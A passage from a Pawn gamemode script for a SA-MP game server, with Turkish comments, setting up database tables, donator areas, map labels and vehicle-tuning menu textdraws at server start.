	) ENGINE=MyISAM DEFAULT CHARSET=utf8;", "", "");

	// 1.3 update, add HouseSalePrice to the houses table
	if(!fexist("house_updated.txt"))
	{
		mysql_tquery(Connection, "ALTER TABLE houses ADD HouseSalePrice INT(11) NOT NULL AFTER HousePrice");

		new File: updateFile = fopen("house_updated.txt", io_append);
		if(updateFile)
		{
		    fwrite(updateFile, "Don't remove this file.");
			fclose(updateFile);
		}
	}

	/* Loading & Stuff */
	mysql_tquery(Connection, "SELECT * FROM houses", "LoadHouses", "");
	mysql_tquery(Connection, "SELECT * FROM housefurnitures", "LoadFurnitures", "");
	foreach(new i : Player) House_PlayerInit(i);

	HouseTimer = SetTimer("ResetAndSaveHouses", 10 * 60000, true);


	// Araç Sahiplik Sistemi
	Arac_Yukle();
	Galeri_Yukle();
	printf("Arac Sahiplik sistemi yuklendi. ( %d Arac, %d Galeri )", Iter_Count(ASHPs), Iter_Count(Gs));


	// Banka Sistemi
	BankSQLHandle = Connection;
	mysql_tquery(BankSQLHandle, "CREATE TABLE IF NOT EXISTS `bank_accounts` (\
	  `ID` int(11) NOT NULL auto_increment,\
	  `Owner` varchar(24) NOT NULL,\
	  `Password` varchar(32) NOT NULL,\
	  `Balance` int(11) NOT NULL,\
	  `CreatedOn` int(11) NOT NULL,\
	  `LastAccess` int(11) NOT NULL,\
	  `Disabled` smallint(1) NOT NULL,\
	  PRIMARY KEY  (`ID`)\
	) ENGINE=InnoDB DEFAULT CHARSET=utf8;");
	print("bank_Acconunts kontrol edildi");
	mysql_format(BankSQLHandle, query, sizeof(query), "CREATE TABLE IF NOT EXISTS `bank_logs` (\
	  	`ID` int(11) NOT NULL auto_increment,\
	  	`AccountID` int(11) NOT NULL,\
	  	`ToAccountID` int(11) NOT NULL default '-1',\
	  	`Type` smallint(1) NOT NULL,\
	  	`Player` varchar(24) NOT NULL,\
	  	`Amount` int(11) NOT NULL,\
	  	`Date` int(11) NOT NULL,");
    print("bank_logs kontrol edildi");
	mysql_format(BankSQLHandle, query, sizeof(query), "%s\
 		PRIMARY KEY  (`ID`),\
 		KEY `bank_logs_ibfk_1` (`AccountID`),\
 		CONSTRAINT `bank_logs_ibfk_1` FOREIGN KEY (`AccountID`) REFERENCES `bank_accounts` (`ID`) ON DELETE CASCADE ON UPDATE CASCADE\
		) ENGINE=InnoDB DEFAULT CHARSET=utf8;", query);
    print("kontrol edildi");
	mysql_tquery(BankSQLHandle, query);
    print("BankSQLHandle kapatildi");
	// Sunucu Ayarlarý
	HaritaYukle(); // MAPLER
	print("Haritalar yuklendi");
	SendRconCommand("rcon 0");
	print("Rcon sifresi sifirlandi");
	//anti ping
	SetTimer("PingCheck",1000,true);
    print("Anti ping kontrolu basladi.");
	AntiDeAMX();
	print("AntiDeAMX aktif");
	WasteDeAMXersTime();
	print("WasteDeAMXersTime Aktif");
	LoadLabels();
	print("Labeller yuklendi");

	SetGameModeText(GameModeName); // Set the Mode of the gamemode, which appears in the list of servers

	print("GameModeName guncellendi");
	GameModeInit_VehiclesPickups(); // Add all static vehicles and pickups when the server starts that are required (also load the houses)
	print("Vehicle Pickups yuklendi");
	GameModeInit_Classes(); // Add character models to the class-selection (without weapons)

	// MeslekUI
	MeslekUI_Load();
	AddPlayerClass(0, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0);
	print("Meslek UI Aktif");
	Convoys_Init(); // Setup textdraws and default data for convoys

	ShowPlayerMarkers(1); // Show players on the entire map (and on the radar)
	print("1");
	ShowNameTags(1); // Show player names (and health) above their head
	print("2");
	ManualVehicleEngineAndLights(); // Let the server control the vehicle's engine and lights
	print("3");
	EnableStuntBonusForAll(0); // Disable stunt bonus for all players
	print("4");
	DisableInteriorEnterExits(); // Removes all building-entrances in the game
    print("5");
	UsePlayerPedAnims(); // Use CJ's walking animation,
	print("6");
	/*/hgs
	if (IsPlayerInRangeOfPoint(playerid, 2.0, 524.7834, 695.2776, 3.4381))
    {
        RewardPlayer(playerid, -200, 0);
    	SendClientMessage(playerid,0xFFFFFFFF,"HGS: 150 Dollar Ödediniz. Iyi Yolculuklar!");
    }
    //HGS
	if (IsPlayerInRangeOfPoint(playerid, 2.0, 528.4603, 703.1720, 3.3147))
    {
        RewardPlayer(playerid, -200, 0);
    	SendClientMessage(playerid,0xFFFFFFFF,"HGS: 150 Dollar Ödediniz. Iyi Yolculuklar!");
    }
	*/
/*
DONATOR YILDIZ POSLARI
AddPlayerClass(46,1039.2250,-1133.5922,23.8203,92.3952,0,0,0,0,0,0); // anayildiz1
AddPlayerClass(46,1034.5385,-1133.7881,23.8203,92.3952,0,0,0,0,0,0); // anayildiz2
AddPlayerClass(46,1030.6992,-1133.7622,23.8203,92.3952,0,0,0,0,0,0); // anayildiz3
AddPlayerClass(46,1025.8662,-1133.7843,23.8203,85.5824,0,0,0,0,0,0); // anayildiz4
AddPlayerClass(46,1020.6780,-1133.5541,23.8281,85.5824,0,0,0,0,0,0); // anayildiz5
AddPlayerClass(46,1016.2457,-1133.7932,23.8281,85.5824,0,0,0,0,0,0); // anayildiz6
AddPlayerClass(46,1011.7985,-1133.4500,23.8281,85.5824,0,0,0,0,0,0); // anayildiz7
AddPlayerClass(46,1007.1649,-1133.4746,23.8281,85.5824,0,0,0,0,0,0); // anayildiz8
AddPlayerClass(46,1002.6264,-1133.9065,23.8281,85.5824,0,0,0,0,0,0); // anayildiz9
AddPlayerClass(46,997.6769,-1133.4930,23.8281,250.7906,0,0,0,0,0,0); // YýldýzPos10
AddPlayerClass(46,993.1180,-1133.5759,23.8281,64.5238,0,0,0,0,0,0); // YýldýzPos11
AddPlayerClass(46,988.6770,-1133.5187,23.8281,89.9041,0,0,0,0,0,0); // YýldýzPos12
AddPlayerClass(46,984.0833,-1133.5913,23.8281,89.9041,0,0,0,0,0,0); // YýldýzPos13
AddPlayerClass(46,979.3619,-1133.5472,23.8203,89.9041,0,0,0,0,0,0); // YýldýzPos14
AddPlayerClass(46,975.0011,-1133.6575,23.8203,89.9041,0,0,0,0,0,0); // YýldýzPos15

DONATOR SOKAK POSLARI
AddPlayerClass(46,1333.4817,-1152.8856,23.6563,87.9089,0,0,0,0,0,0); // sokakadi1
AddPlayerClass(46,1333.8912,-1137.2057,23.6563,90.7289,0,0,0,0,0,0); // sokakadi2
AddPlayerClass(46,1262.4531,-1130.6604,23.6707,178.7530,0,0,0,0,0,0); // sokakadi3
AddPlayerClass(46,1216.0276,-1159.2892,23.3832,355.4513,0,0,0,0,0,0); // sokakadi4
AddPlayerClass(46,1162.7590,-1130.6740,23.6769,176.2464,0,0,0,0,0,0); // sokakadi5
AddPlayerClass(46,1082.6345,-1130.3771,23.6754,181.5731,0,0,0,0,0,0); // sokakadi6
AddPlayerClass(46,1058.3138,-1159.5599,23.6637,2.9715,0,0,0,0,0,0); // sokakadi7
AddPlayerClass(46,962.7678,-1130.3239,23.6631,186.5865,0,0,0,0,0,0); // sokakadi8
AddPlayerClass(46,942.3871,-1159.1194,23.6563,2.6582,0,0,0,0,0,0); // sokakadi9
AddPlayerClass(46,806.8266,-1149.1744,23.8472,266.4872,0,0,0,0,0,0); // sokakadi10
AddPlayerClass(46,806.7548,-1140.0442,23.8990,268.3672,0,0,0,0,0,0); // sokakadi11

*/

	print("Donator yuklenme alanina gelindi");
	// Donator Sistemi
	LoadDon();
	printf("Donatorler yuklendi. ( %d Donator )", Iter_Count(DONs));
/*
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}Hakan", -1, 1039.2250,-1133.5922,23.0203, 50.0);
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}TeaMStar", -1, 1034.5385,-1133.7881,23.0203, 50.0);
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}Ghostevil", -1, 1030.6992,-1133.7622,23.0203, 50.0);
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}NicqsiZAcent", -1, 1025.8662,-1133.7843,23.0203, 50.0);
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}", -1, 1020.6780,-1133.5541,23.0281, 50.0);
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}", -1, 1016.2457,-1133.7932,23.0281, 50.0);
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}", -1, 1011.7985,-1133.4500,23.0281, 50.0);
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}huseyin", -1, 1007.1649,-1133.4746,23.0281, 50.0);
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}[DM]MeLoH", -1, 1002.6264,-1133.9065,23.0281, 50.0);
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}[KGT]PolatAlemdar", -1, 997.6769,-1133.4930,23.0281, 50.0);
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}[Ekip]BabaMrb", -1, 993.1180,-1133.5759,23.0281, 50.0);
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}DoLpHiN", -1, 988.6770,-1133.5187,23.0281, 50.0);
    CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}Just_Watch", -1, 984.0833,-1133.5913,23.0281, 50.0);
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}Alihank.", -1, 979.3619,-1133.5472,23.0203, 50.0);       // sedat2
	CreateDynamic3DTextLabel("{F8F8FF}Donator\n{ADFF2F}Batux0", -1, 975.0011,-1133.6575,23.0203, 50.0);       // sedat2
*/
	CreateDynamic3DTextLabel("{FFC000}DONATOR SOKAÐI", -1, 1333.4817,-1152.8856,23.6563, 50.0);
	CreateDynamic3DTextLabel("{FFC000}DONATOR SOKAÐI", -1, 1333.8912,-1137.2057,23.6563, 50.0);
	CreateDynamic3DTextLabel("{FFC000}DONATOR SOKAÐI", -1, 1262.4531,-1130.6604,23.6707, 50.0);
	CreateDynamic3DTextLabel("{FFC000}DONATOR SOKAÐI", -1, 1216.0276,-1159.2892,23.3832, 50.0);
	CreateDynamic3DTextLabel("{FFC000}DONATOR SOKAÐI", -1, 1162.7590,-1130.6740,23.6769, 50.0);
	CreateDynamic3DTextLabel("{FFC000}DONATOR SOKAÐI", -1, 1082.6345,-1130.3771,23.6754, 50.0);
	CreateDynamic3DTextLabel("{FFC000}DONATOR SOKAÐI", -1, 1058.3138,-1159.5599,23.6637, 50.0);
	CreateDynamic3DTextLabel("{FFC000}DONATOR SOKAÐI", -1, 962.7678,-1130.3239,23.6631, 50.0);
	CreateDynamic3DTextLabel("{FFC000}DONATOR SOKAÐI", -1, 942.3871,-1159.1194,23.6563, 50.0);
	CreateDynamic3DTextLabel("{FFC000}DONATOR SOKAÐI", -1, 806.8266,-1149.1744,23.8472, 50.0);
	CreateDynamic3DTextLabel("{FFC000}DONATOR SOKAÐI", -1, 806.7548,-1140.0442,23.8990, 50.0);

	// VIP Lounge
	CreateDynamicPickup(1314, 1, 334.1600, -1823.1455, 4.6207, 0); // VIP Lounge Dýþý
	CreateDynamicPickup(1314, 1, -4107.2471, 906.1700, 3.1007, 0); // VIP Lounge Ýçi

	CreateDynamic3DTextLabel("{FFCC00}» {FFFFFF}DONATOR MEKANI\n{DDDDDD}Ýçeri sadece Donator'ler girebilir!\n{80FFFF}/icerigir", -1, 334.1600, -1823.1455, 4.6207, 50.0);
	CreateDynamic3DTextLabel("{FFCC00}» {FFFFFF}DONATOR MEKANI\n{DDDDDD}Çýkýþ\n{80FFFF}/icerigir", -1, -4107.2471, 906.1700, 3.1007, 50.0);

	CreateDynamicMapIcon(334.1600, -1823.1455, 4.6207, 23, 0, 0, 0, -1, 8000.0);

	// AirBalloon Sistemi
	CreateDynamicPickup(1274, 1, 263.5667,-1863.8475,2.8567, 0);

	CreateDynamic3DTextLabel("{FFCC00}» {FFFFFF}BALON KIRALAMA\n{DDDDDD}5000$'a balon kiralayýp þehri gezebilirsiniz.\n{80FFFF}/balon", -1, 263.5667,-1863.8475,2.8567, 50.0);

	CreateDynamicMapIcon(263.5667,-1863.8475,2.8567, 37, 0, 0, 0, -1, 8000.0);

	// huseyin Santa Maria Beach Mansion
	CreateDynamic3DTextLabel("{FFCC00}» {FFFFFF}DONATOR MEKANI\n{DDDDDD}Ýçeri sadece {FFC000}huseyin{DDDDDD} girebilir!\n{80FFFF}/icerigir", -1, 495.3529, -1934.8323, 12.7938, 50.0);

	// Anadolu Island GAPIlarý :D ( Sedo hocam Gate olduðunu iddia etti ) Metin ile sabah sabah delirmeceler
	GAPI[0] = CreateObject(980,-4271.7998000,-1253.7998000,23.0000000,0.0000000,0.0000000,72.9490000, 100.0); //object(airportgate) (1)
	GAPI[1] = CreateObject(980,-3732.0000000,-2159.8000000,17.5000000,0.0000000,0.0000000,200.9450000, 100.0); //gapi2
//Puþt Tabela Sistemi
	TrafikGuncelle();

	// Arkadaþlýk Sistemi
    grupYukle();

	//Wtune

	wTuning1[0] = TextDrawCreate(560.000000, 102.000000, "_");
	TextDrawBackgroundColor(wTuning1[0], 255);
	TextDrawFont(wTuning1[0], 1);
	TextDrawLetterSize(wTuning1[0], 0.709999, 1.599998);
	TextDrawColor(wTuning1[0], 852308735);
	TextDrawSetOutline(wTuning1[0], 0);
	TextDrawSetProportional(wTuning1[0], 1);
	TextDrawSetShadow(wTuning1[0], 1);
	TextDrawUseBox(wTuning1[0], 1);
	TextDrawBoxColor(wTuning1[0], 793726975);
	TextDrawTextSize(wTuning1[0], 72.000000, 20.000000);
	TextDrawSetSelectable(wTuning1[0], 0);

	wTuning1[1] = TextDrawCreate(560.000000, 120.000000, "_");
	TextDrawBackgroundColor(wTuning1[1], 255);
	TextDrawFont(wTuning1[1], 1);
	TextDrawLetterSize(wTuning1[1], 0.709999, 1.699998);
	TextDrawColor(wTuning1[1], -1);
	TextDrawSetOutline(wTuning1[1], 0);
	TextDrawSetProportional(wTuning1[1], 1);
	TextDrawSetShadow(wTuning1[1], 1);
	TextDrawUseBox(wTuning1[1], 1);
	TextDrawBoxColor(wTuning1[1], 150);
	TextDrawTextSize(wTuning1[1], 72.000000, 20.000000);
	TextDrawSetSelectable(wTuning1[1], 0);

	wTuning1[2] = TextDrawCreate(243.000000, 144.000000, "_");
	TextDrawBackgroundColor(wTuning1[2], 255);
	TextDrawFont(wTuning1[2], 1);
	TextDrawLetterSize(wTuning1[2], 0.709999, 21.299999);
	TextDrawColor(wTuning1[2], -1);
	TextDrawSetOutline(wTuning1[2], 0);
	TextDrawSetProportional(wTuning1[2], 1);
	TextDrawSetShadow(wTuning1[2], 1);
	TextDrawUseBox(wTuning1[2], 1);
	TextDrawBoxColor(wTuning1[2], 150);
	TextDrawTextSize(wTuning1[2], 72.000000, 19.000000);
	TextDrawSetSelectable(wTuning1[2], 0);

	wTuning1[3] = TextDrawCreate(271.000000, 105.000000, "MODIFIYE KATEGORISI");
	TextDrawBackgroundColor(wTuning1[3], 255);
	TextDrawFont(wTuning1[3], 2);
	TextDrawLetterSize(wTuning1[3], 0.300000, 1.000000);
	TextDrawColor(wTuning1[3], -1);
	TextDrawSetOutline(wTuning1[3], 0);
	TextDrawSetProportional(wTuning1[3], 1);
	TextDrawSetShadow(wTuning1[3], 0);
	TextDrawSetSelectable(wTuning1[3], 0);

	wTuning1[4] = TextDrawCreate(368.000000, 152.000000, "Yukaridaki Menuler Ile Aracinizi Modifiye Edebilirsiniz");
	TextDrawBackgroundColor(wTuning1[4], 255);
	TextDrawFont(wTuning1[4], 2);
	TextDrawLetterSize(wTuning1[4], 0.250000, 1.100000);
	TextDrawColor(wTuning1[4], -1);
	TextDrawSetOutline(wTuning1[4], 0);
	TextDrawSetProportional(wTuning1[4], 1);
	TextDrawSetShadow(wTuning1[4], 0);
	TextDrawSetSelectable(wTuning1[4], 0);

	wTuning1[5] = TextDrawCreate(560.000000, 144.000000, "_");
	TextDrawBackgroundColor(wTuning1[5], 255);
	TextDrawFont(wTuning1[5], 1);
	TextDrawLetterSize(wTuning1[5], 0.709999, 2.900000);
	TextDrawColor(wTuning1[5], -1);
	TextDrawSetOutline(wTuning1[5], 0);
	TextDrawSetProportional(wTuning1[5], 1);
	TextDrawSetShadow(wTuning1[5], 1);
	TextDrawUseBox(wTuning1[5], 1);
	TextDrawBoxColor(wTuning1[5], 793726975);
	TextDrawTextSize(wTuning1[5], 247.000000, 19.000000);
	TextDrawSetSelectable(wTuning1[5], 0);

	wTuning1[6] = TextDrawCreate(538.000000, 105.000000, "X");
	TextDrawBackgroundColor(wTuning1[6], 255);
	TextDrawFont(wTuning1[6], 1);
	TextDrawLetterSize(wTuning1[6], 0.500000, 1.000000);
	TextDrawColor(wTuning1[6], 255);
	TextDrawSetOutline(wTuning1[6], 0);
	TextDrawSetProportional(wTuning1[6], 1);
	TextDrawSetShadow(wTuning1[6], 0);
	TextDrawUseBox(wTuning1[6], 1);
	TextDrawBoxColor(wTuning1[6], 0);
	TextDrawTextSize(wTuning1[6], 550.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[6], 1);

	wTuning1[7] = TextDrawCreate(88.000000, 123.000000, "JANT");
	TextDrawBackgroundColor(wTuning1[7], 255);
	TextDrawFont(wTuning1[7], 2);
	TextDrawLetterSize(wTuning1[7], 0.300000, 1.000000);
	TextDrawColor(wTuning1[7], -1);
	TextDrawSetOutline(wTuning1[7], 0);
	TextDrawSetProportional(wTuning1[7], 1);
	TextDrawSetShadow(wTuning1[7], 0);
	TextDrawUseBox(wTuning1[7], 1);
	TextDrawBoxColor(wTuning1[7], 0);
	TextDrawTextSize(wTuning1[7], 137.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[7], 0);

	wTuning1[8] = TextDrawCreate(150.000000, 123.000000, "RENK");
	TextDrawBackgroundColor(wTuning1[8], 255);
	TextDrawFont(wTuning1[8], 2);
	TextDrawLetterSize(wTuning1[8], 0.300000, 1.000000);
	TextDrawColor(wTuning1[8], -1);
	TextDrawSetOutline(wTuning1[8], 0);
	TextDrawSetProportional(wTuning1[8], 1);
	TextDrawSetShadow(wTuning1[8], 0);
	TextDrawUseBox(wTuning1[8], 1);
	TextDrawBoxColor(wTuning1[8], 0);
	TextDrawTextSize(wTuning1[8], 190.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[8], 0);

	wTuning1[9] = TextDrawCreate(204.000000, 123.000000, "Paintjob");
	TextDrawBackgroundColor(wTuning1[9], 255);
	TextDrawFont(wTuning1[9], 2);
	TextDrawLetterSize(wTuning1[9], 0.300000, 1.000000);
	TextDrawColor(wTuning1[9], -1);
	TextDrawSetOutline(wTuning1[9], 0);
	TextDrawSetProportional(wTuning1[9], 1);
	TextDrawSetShadow(wTuning1[9], 0);
	TextDrawUseBox(wTuning1[9], 1);
	TextDrawBoxColor(wTuning1[9], 0);
	TextDrawTextSize(wTuning1[9], 274.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[9], 0);

	wTuning1[10] = TextDrawCreate(284.000000, 123.000000, "Nitro");
	TextDrawBackgroundColor(wTuning1[10], 255);
	TextDrawFont(wTuning1[10], 2);
	TextDrawLetterSize(wTuning1[10], 0.300000, 1.000000);
	TextDrawColor(wTuning1[10], -1);
	TextDrawSetOutline(wTuning1[10], 0);
	TextDrawSetProportional(wTuning1[10], 1);
	TextDrawSetShadow(wTuning1[10], 0);
	TextDrawUseBox(wTuning1[10], 1);
	TextDrawBoxColor(wTuning1[10], 0);
	TextDrawTextSize(wTuning1[10], 320.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[10], 0);

	wTuning1[11] = TextDrawCreate(334.000000, 123.000000, "Hidrolik");
	TextDrawBackgroundColor(wTuning1[11], 255);
	TextDrawFont(wTuning1[11], 2);
	TextDrawLetterSize(wTuning1[11], 0.300000, 1.000000);
	TextDrawColor(wTuning1[11], -1);
	TextDrawSetOutline(wTuning1[11], 0);
	TextDrawSetProportional(wTuning1[11], 1);
	TextDrawSetShadow(wTuning1[11], 0);
	TextDrawUseBox(wTuning1[11], 1);
	TextDrawBoxColor(wTuning1[11], 0);
	TextDrawTextSize(wTuning1[11], 411.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[11], 0);

	wTuning1[12] = TextDrawCreate(424.000000, 123.000000, "Neon");
	TextDrawBackgroundColor(wTuning1[12], 255);
	TextDrawFont(wTuning1[12], 2);
	TextDrawLetterSize(wTuning1[12], 0.300000, 1.000000);
	TextDrawColor(wTuning1[12], -1);
	TextDrawSetOutline(wTuning1[12], 0);
	TextDrawSetProportional(wTuning1[12], 1);
	TextDrawSetShadow(wTuning1[12], 0);
	TextDrawUseBox(wTuning1[12], 1);
	TextDrawBoxColor(wTuning1[12], 0);
	TextDrawTextSize(wTuning1[12], 457.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[12], 0);


	wTuning1[13] = TextDrawCreate(466.000000, 123.000000, "OTO-MODIFIYE");
	TextDrawBackgroundColor(wTuning1[13], 255);
	TextDrawFont(wTuning1[13], 2);
	TextDrawLetterSize(wTuning1[13], 0.300000, 1.000000);
	TextDrawColor(wTuning1[13], -1);
	TextDrawSetOutline(wTuning1[13], 0);
	TextDrawSetProportional(wTuning1[13], 1);
	TextDrawSetShadow(wTuning1[13], 0);
	TextDrawUseBox(wTuning1[13], 1);
	TextDrawBoxColor(wTuning1[13], 0);
	TextDrawTextSize(wTuning1[13], 542.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[13], 0);


	wTuning1[14] = TextDrawCreate(88.000000, 149.000000, "SIYAH___________________");
	TextDrawBackgroundColor(wTuning1[14], 255);
	TextDrawFont(wTuning1[14], 2);
	TextDrawLetterSize(wTuning1[14], 0.300000, 1.000000);
	TextDrawColor(wTuning1[14], -1);
	TextDrawSetOutline(wTuning1[14], 0);
	TextDrawSetProportional(wTuning1[14], 1);
	TextDrawSetShadow(wTuning1[14], 0);
	TextDrawUseBox(wTuning1[14], 1);
	TextDrawBoxColor(wTuning1[14], 0);
	TextDrawTextSize(wTuning1[14], 190.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[14], 0);

	wTuning1[15] = TextDrawCreate(88.000000, 168.000000, "BEYAZ____________________");
	TextDrawBackgroundColor(wTuning1[15], 255);
	TextDrawFont(wTuning1[15], 2);
	TextDrawLetterSize(wTuning1[15], 0.300000, 1.000000);
	TextDrawColor(wTuning1[15], -1);
	TextDrawSetOutline(wTuning1[15], 0);
	TextDrawSetProportional(wTuning1[15], 1);
	TextDrawSetShadow(wTuning1[15], 0);
	TextDrawUseBox(wTuning1[15], 1);
	TextDrawBoxColor(wTuning1[15], 0);
	TextDrawTextSize(wTuning1[15], 170.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[15], 0);

	wTuning1[16] = TextDrawCreate(88.000000, 190.000000, "YESIL___________________");
	TextDrawBackgroundColor(wTuning1[16], 255);
	TextDrawFont(wTuning1[16], 2);
	TextDrawLetterSize(wTuning1[16], 0.300000, 1.000000);
	TextDrawColor(wTuning1[16], -1);
	TextDrawSetOutline(wTuning1[16], 0);
	TextDrawSetProportional(wTuning1[16], 1);
	TextDrawSetShadow(wTuning1[16], 0);
	TextDrawUseBox(wTuning1[16], 1);
	TextDrawBoxColor(wTuning1[16], 0);
	TextDrawTextSize(wTuning1[16], 171.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[16], 0);

	wTuning1[17] = TextDrawCreate(88.000000, 213.000000, "AMAVI_____________________");
	TextDrawBackgroundColor(wTuning1[17], 255);
	TextDrawFont(wTuning1[17], 2);
	TextDrawLetterSize(wTuning1[17], 0.300000, 1.000000);
	TextDrawColor(wTuning1[17], -1);
	TextDrawSetOutline(wTuning1[17], 0);
	TextDrawSetProportional(wTuning1[17], 1);
	TextDrawSetShadow(wTuning1[17], 0);
	TextDrawUseBox(wTuning1[17], 1);
	TextDrawBoxColor(wTuning1[17], 0);
	TextDrawTextSize(wTuning1[17], 171.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[17], 0);

	wTuning1[18] = TextDrawCreate(88.000000, 233.000000, "MAVI_____________________");
	TextDrawBackgroundColor(wTuning1[18], 255);
	TextDrawFont(wTuning1[18], 2);
	TextDrawLetterSize(wTuning1[18], 0.300000, 1.000000);
	TextDrawColor(wTuning1[18], -1);
	TextDrawSetOutline(wTuning1[18], 0);
	TextDrawSetProportional(wTuning1[18], 1);
	TextDrawSetShadow(wTuning1[18], 0);
	TextDrawUseBox(wTuning1[18], 1);
	TextDrawBoxColor(wTuning1[18], 0);
	TextDrawTextSize(wTuning1[18], 170.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[18], 0);

	wTuning1[19] = TextDrawCreate(87.000000, 254.000000, "SARI________________");
	TextDrawBackgroundColor(wTuning1[19], 255);
	TextDrawFont(wTuning1[19], 2);
	TextDrawLetterSize(wTuning1[19], 0.300000, 1.000000);
	TextDrawColor(wTuning1[19], -1);
	TextDrawSetOutline(wTuning1[19], 0);
	TextDrawSetProportional(wTuning1[19], 1);
	TextDrawSetShadow(wTuning1[19], 0);
	TextDrawUseBox(wTuning1[19], 1);
	TextDrawBoxColor(wTuning1[19], 0);
	TextDrawTextSize(wTuning1[19], 180.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[19], 0);

	wTuning1[20] = TextDrawCreate(87.000000, 275.000000, "GRI_____________________");
	TextDrawBackgroundColor(wTuning1[20], 255);
	TextDrawFont(wTuning1[20], 2);
	TextDrawLetterSize(wTuning1[20], 0.300000, 1.000000);
	TextDrawColor(wTuning1[20], -1);
	TextDrawSetOutline(wTuning1[20], 0);
	TextDrawSetProportional(wTuning1[20], 1);
	TextDrawSetShadow(wTuning1[20], 0);
	TextDrawUseBox(wTuning1[20], 1);
	TextDrawBoxColor(wTuning1[20], 0);
	TextDrawTextSize(wTuning1[20], 229.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[20], 0);

	wTuning1[21] = TextDrawCreate(87.000000, 293.000000, "KIRMIZI_____________________");
	TextDrawBackgroundColor(wTuning1[21], 255);
	TextDrawFont(wTuning1[21], 2);
	TextDrawLetterSize(wTuning1[21], 0.300000, 1.000000);
	TextDrawColor(wTuning1[21], -1);
	TextDrawSetOutline(wTuning1[21], 0);
	TextDrawSetProportional(wTuning1[21], 1);
	TextDrawSetShadow(wTuning1[21], 0);
	TextDrawUseBox(wTuning1[21], 1);
	TextDrawBoxColor(wTuning1[21], 0);
	TextDrawTextSize(wTuning1[21], 170.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[21], 0);

	wTuning1[22] = TextDrawCreate(87.000000, 312.000000, "TURUNCU________________");
	TextDrawBackgroundColor(wTuning1[22], 255);
	TextDrawFont(wTuning1[22], 2);
	TextDrawLetterSize(wTuning1[22], 0.300000, 1.000000);
	TextDrawColor(wTuning1[22], -1);
	TextDrawSetOutline(wTuning1[22], 0);
	TextDrawSetProportional(wTuning1[22], 1);
	TextDrawSetShadow(wTuning1[22], 0);
	TextDrawUseBox(wTuning1[22], 1);
	TextDrawBoxColor(wTuning1[22], 0);
	TextDrawTextSize(wTuning1[22], 170.000000, 10.000000);
	TextDrawSetSelectable(wTuning1[22], 0);
	//------------------------------------------------------------------------------
	//
	//
	//------------------------------------------------------------------------------
	wTuning2[0] = TextDrawCreate(88.000000, 149.000000, "Shadow________________");
	TextDrawBackgroundColor(wTuning2[0], 255);
	TextDrawFont(wTuning2[0], 2);
	TextDrawLetterSize(wTuning2[0], 0.300000, 1.000000);
	TextDrawColor(wTuning2[0], -1);
	TextDrawSetOutline(wTuning2[0], 0);
	TextDrawSetProportional(wTuning2[0], 1);
	TextDrawSetShadow(wTuning2[0], 0);
	TextDrawUseBox(wTuning2[0], 1);
	TextDrawBoxColor(wTuning2[0], 0);
	TextDrawTextSize(wTuning2[0], 190.000000, 10.000000);
	TextDrawSetSelectable(wTuning2[0], 0);

	wTuning2[1] = TextDrawCreate(88.000000, 168.000000, "Mega_____________________");
	TextDrawBackgroundColor(wTuning2[1], 255);
	TextDrawFont(wTuning2[1], 2);
	TextDrawLetterSize(wTuning2[1], 0.300000, 1.000000);
	TextDrawColor(wTuning2[1], -1);
	TextDrawSetOutline(wTuning2[1], 0);
	TextDrawSetProportional(wTuning2[1], 1);
	TextDrawSetShadow(wTuning2[1], 0);
	TextDrawUseBox(wTuning2[1], 1);
	TextDrawBoxColor(wTuning2[1], 0);
	TextDrawTextSize(wTuning2[1], 170.000000, 10.000000);
	TextDrawSetSelectable(wTuning2[1], 0);

	wTuning2[2] = TextDrawCreate(88.000000, 190.000000, "Rimshine_____________");
	TextDrawBackgroundColor(wTuning2[2], 255);
	TextDrawFont(wTuning2[2], 2);
	TextDrawLetterSize(wTuning2[2], 0.300000, 1.000000);
	TextDrawColor(wTuning2[2], -1);
	TextDrawSetOutline(wTuning2[2], 0);
	TextDrawSetProportional(wTuning2[2], 1);
	TextDrawSetShadow(wTuning2[2], 0);
	TextDrawUseBox(wTuning2[2], 1);
	TextDrawBoxColor(wTuning2[2], 0);
	TextDrawTextSize(wTuning2[2], 171.000000, 10.000000);
	TextDrawSetSelectable(wTuning2[2], 0);

	wTuning2[3] = TextDrawCreate(88.000000, 213.000000, "Wires___________________");
	TextDrawBackgroundColor(wTuning2[3], 255);
	TextDrawFont(wTuning2[3], 2);
	TextDrawLetterSize(wTuning2[3], 0.300000, 1.000000);
	TextDrawColor(wTuning2[3], -1);
	TextDrawSetOutline(wTuning2[3], 0);
	TextDrawSetProportional(wTuning2[3], 1);
	TextDrawSetShadow(wTuning2[3], 0);
	TextDrawUseBox(wTuning2[3], 1);
	TextDrawBoxColor(wTuning2[3], 0);
	TextDrawTextSize(wTuning2[3], 171.000000, 10.000000);
	TextDrawSetSelectable(wTuning2[3], 0);

